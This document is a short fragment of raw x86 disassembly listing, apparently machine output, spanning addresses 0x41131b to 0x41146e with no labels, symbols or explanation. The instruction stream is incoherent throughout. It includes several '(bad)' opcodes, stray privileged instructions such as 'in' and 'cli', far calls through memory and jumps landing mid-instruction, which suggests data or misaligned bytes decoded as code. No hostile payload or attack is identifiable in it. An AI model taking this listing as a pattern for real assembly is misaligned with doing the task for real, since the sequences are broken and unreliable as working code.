  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
